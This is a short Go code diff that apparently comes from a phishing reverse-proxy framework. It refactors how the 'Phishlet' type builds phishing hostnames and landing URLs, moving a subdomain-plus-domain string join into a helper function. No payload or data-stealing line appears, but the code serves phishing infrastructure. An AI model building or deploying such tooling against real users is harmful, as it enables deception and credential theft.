@@ -159,7 +159,7 @@ func (p *Phishlet) GetPhishHosts() []string {
 	for _, h := range p.proxyHosts {
 		phishDomain, ok := p.cfg.GetSiteDomain(p.Site)
 		if ok {
-			ret = append(ret, h.phish_subdomain+"."+phishDomain)
+			ret = append(ret, combineHost(h.phish_subdomain, phishDomain))
 		}
 	}
 	return ret
@@ -172,7 +172,7 @@ func (p *Phishlet) GetLandingUrls(redirect_url string) ([]string, error) {
 		if h.is_landing {
 			phishDomain, ok := p.cfg.GetSiteDomain(p.Site)
 			if ok {
-				host = h.phish_subdomain + "." + phishDomain
+				host = combineHost(h.phish_subdomain, phishDomain)
 			}
 		}
 	}
